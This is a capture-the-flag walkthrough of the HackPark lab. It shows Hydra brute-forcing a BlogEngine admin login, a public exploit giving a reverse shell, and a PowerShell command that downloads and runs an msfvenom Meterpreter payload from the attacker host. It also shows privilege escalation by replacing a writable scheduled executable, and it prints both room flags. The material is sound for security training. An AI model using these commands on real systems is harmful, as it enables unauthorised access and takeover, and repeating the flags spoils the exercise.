## HackPark
Brute forcing a website login with Hydra, identify and use a public exploit then escalate the privileges on a Windows machine!

### ### Reconnaissance
- There is a HTTP webpage on port 80 and is running a blog.
- Have couple pages and a login page at http://10.10.81.179/Account/login.aspx?ReturnURL=/admin/
- When visited the home page source, can see the comment saying the website is using BlogEngine 3.3.6.0
- Performed a nmap scan on the server to find if there are any open ports and other services.
- 

    PORT     STATE SERVICE            VERSION
    80/tcp   open  http               Microsoft IIS httpd 8.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | http-robots.txt: 6 disallowed entries 
    | /Account/*.* /search /search.aspx /error404.aspx 
    |_/archive /archive.aspx
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: hackpark | hackpark amusements
    3389/tcp open  ssl/ms-wbt-server?
    |_ssl-date: 2020-07-04T17:15:46+00:00; -5s from scanner time.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: -5s

- From above, we can see the server is running IIS HTTP 8.5 on port 80 and have 6 pages that are blocked for crawlers. 
- 3389 is open - potentially for RDP. 

### Cracking the login credentials
The default credentials for Blog Engine are admin:admin (Googled it), but it didn't worked, so let's brute force the admin id using hydra.

Before that we need to know the post request that this web page is generating for login, using Burp we can intercept the request and gather the required information.

    POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
    Host: 10.10.226.92
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.226.92/Account/login.aspx?ReturnURL=/admin/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 560
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    __VIEWSTATE=yrGSghNTTe59EhrZcotASBiG%2Fu27NFaNuaqaeJeceE2phHcTUqsXZ3Hl0a3SRfJ0VxuhZAjPF9VCrM6Q8x%2Fj6%2FQSuqhpgUXtrre1D%2BLhluiHKRZKCMF%2Btml5SyIgJed9mYrfaKSB5ecanrjmrT%2BnZHZUlGBG7UQ%2B1aIm74Iwy7D17DW9&__EVENTVALIDATION=jQVBkrYlbLeIG3SEUABAYZue3flPuZINcj8gu8A7CNvKIDb5QlIARVaqkq%2BUWa8%2FS5XYm0r28kj%2B3Im0tRMi1Zl4cd1hWRYiAPt3Hx5keSDUgU%2B4qqJ3DdJpI9gvJniOuEDK9y5%2FfqAiU%2FKfZFGbTENvw835mmLdTut1KKEJTpoFeMIx&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in 

Using the above information from Burp, we can now frame the request in hydra for brute forcing. 

    $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.226.92 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=yrGSghNTTe59EhrZcotASBiG%2Fu27NFaNuaqaeJeceE2phHcTUqsXZ3Hl0a3SRfJ0VxuhZAjPF9VCrM6Q8x%2Fj6%2FQSuqhpgUXtrre1D%2BLhluiHKRZKCMF%2Btml5SyIgJed9mYrfaKSB5ecanrjmrT%2BnZHZUlGBG7UQ%2B1aIm74Iwy7D17DW9&__EVENTVALIDATION=jQVBkrYlbLeIG3SEUABAYZue3flPuZINcj8gu8A7CNvKIDb5QlIARVaqkq%2BUWa8%2FS5XYm0r28kj%2B3Im0tRMi1Zl4cd1hWRYiAPt3Hx5keSDUgU%2B4qqJ3DdJpI9gvJniOuEDK9y5%2FfqAiU%2FKfZFGbTENvw835mmLdTut1KKEJTpoFeMIx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    
    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-04 20:43:57
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking http-post-form://10.10.226.92:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=yrGSghNTTe59EhrZcotASBiG%2Fu27NFaNuaqaeJeceE2phHcTUqsXZ3Hl0a3SRfJ0VxuhZAjPF9VCrM6Q8x%2Fj6%2FQSuqhpgUXtrre1D%2BLhluiHKRZKCMF%2Btml5SyIgJed9mYrfaKSB5ecanrjmrT%2BnZHZUlGBG7UQ%2B1aIm74Iwy7D17DW9&__EVENTVALIDATION=jQVBkrYlbLeIG3SEUABAYZue3flPuZINcj8gu8A7CNvKIDb5QlIARVaqkq%2BUWa8%2FS5XYm0r28kj%2B3Im0tRMi1Zl4cd1hWRYiAPt3Hx5keSDUgU%2B4qqJ3DdJpI9gvJniOuEDK9y5%2FfqAiU%2FKfZFGbTENvw835mmLdTut1KKEJTpoFeMIx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
    [STATUS] 949.00 tries/min, 949 tries in 00:01h, 14343450 to do in 251:55h, 16 active
    [80][http-post-form] host: 10.10.226.92   login: admin   password: 1qaz2wsx
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-04 20:45:33

The brute force attack found the password for admin account as: 1qaz2wsx

### Getting a reverse shell
- Using the [exploit](https://www.exploit-db.com/exploits/46353), update the local host ip in it and upload the file with the name as PostView.ascx using the post editor. 
- Open a netcat session to receive a reverse shell connection `nc -lnvp 4445`
Run the exploit with directory traversal `10.10.73.64/?theme=../../App_Data/files`
- The reverse shell should be established on the netcat session.  
-

    $ nc -lnvp 4445
    listening on [any] 4445 ...
    connect to [10.2.18.4] from (UNKNOWN) [10.10.73.64] 54341
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    whoami
    c:\windows\system32\inetsrv>whoami
    iis apppool\blog

The web server is running with the user `iis apppool\blog`. 

### Privilege Escalation 

- Lets create a meterpreter session for more stable executions, to do this, we need to create a payload using msfvenom:
`$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.18.4 LPORT=4444 -f exe -o shell.exe`

- Open a reverse shell handler in Metasploit using the `exploit/multi/handler` with payload `windows/meterpreter/reverse_tcp` on port 4444.

- Start a simple web server using `python3 -m http.server` in same directory. 
In the reverse shell that was already opened earlier, with the help of powershell lets download the payload and start the process.
- 

    powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
    c:\Windows\Temp>powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
    dir
    c:\Windows\Temp>dir
     Volume in drive C has no label.
     Volume Serial Number is 0E97-C552
     Directory of c:\Windows\Temp
    07/05/2020  08:34 AM    <DIR>          .
    07/05/2020  08:34 AM    <DIR>          ..
    08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
    08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
    08/06/2019  02:13 PM             1,206 cleanup.txt
    08/06/2019  02:13 PM               421 cmdout
    08/06/2019  02:11 PM                 0 DMI2EBC.tmp
    08/03/2019  10:43 AM                 0 DMI4D21.tmp
    08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
    08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
    07/05/2020  08:34 AM    <DIR>          Microsoft
    07/05/2020  08:34 AM            73,802 shell.exe
    08/06/2019  02:13 PM                21 stage1-complete.txt
    08/06/2019  02:13 PM            28,495 stage1.txt
    05/12/2019  09:03 PM           113,328 svcexec.exe
    08/06/2019  02:13 PM                67 tmp.dat
                  13 File(s)        708,784 bytes
                   3 Dir(s)  39,141,916,672 bytes free
    
    .\shell.exe
    c:\Windows\Temp>.\shell.exe  

- This should open a Meterpreter session: 
- 

    meterpreter > sysinfo
    Computer        : HACKPARK
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    meterpreter > 


Let see what services are running on the host and if there are any that we can use for exploit `meterpreter > ps`.

Of all the listed services, we can see windows scheduler is running.
 

     1376  672   WService.exe 
     1556  1376  WScheduler.exe 

Navigate to `c:\Program Files (x86)\SystemScheduler\Events` to examine the scheduler logs and the file `20198415519.INI_LOG.txt` shows there is a service `Message.exe` which is running every 30 seconds and the file is writable to everyone. 

    100777/rwxrwxrwx  536992   fil   2019-08-04 07:36:42 -0400  Message.exe

 Using the above, we can now replace this file with a malicious code which can spawn a shell. We already have a shell code that was generated using `msfvenom` earlier, so lets upload that to the victim and rename to Message.exe

    meterpreter > upload shell.exe 
    [*] uploading  : shell.exe -> shell.exe
    [*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): shell.exe -> shell.exe
    [*] uploaded   : shell.exe -> shell.exe
    meterpreter > dir

Background the current Meterpreter session and start a new `multi/handler`  reverse shell listener. Wait for the scheduler to execute the malicious code and once executed, a new connection is established with administrator id. 

    meterpreter > background 
    [*] Backgrounding session 2...
    msf5 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 10.2.18.4:4444 
    [*] Sending stage (176195 bytes) to 10.10.29.198
    [*] Meterpreter session 3 opened (10.2.18.4:4444 -> 10.10.29.198:64956) at 2020-07-05 12:56:07 -0400 
    meterpreter > shell
    Process 2484 created.
    Channel 1 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    
    C:\PROGRA~2\SYSTEM~1>whoami
    whoami
    
    C:\PROGRA~2\SYSTEM~1>echo %username%
    echo %username%
    Administrator

We now have the Meterpreter session with Administrator access and grab the flags from `C:\Users\jeff\Desktop\user.txt` and `C:\Users\Administrator\Desktop\root.txt` which are 759bd8af507517bcfaede78a21a73e39 and 7e13d97f05f7ceb9881a3eb3d78d3e72 respectively. 

 
### Using WinPEAS

 [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) is a utility where we can find more information about the Windows host and for any vulnerabilities. Download the file into the victim machine just like shell.exe above. 

From the Meterpreter, start the shell and execute the winPEAS.bat.

    meterpreter > shell
    Process 1008 created.
    Channel 1 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.
    
    c:\Windows\Temp>.\winPEAS.bat

The system Original Install Date:     8/3/2019, 10:43:23 AM.




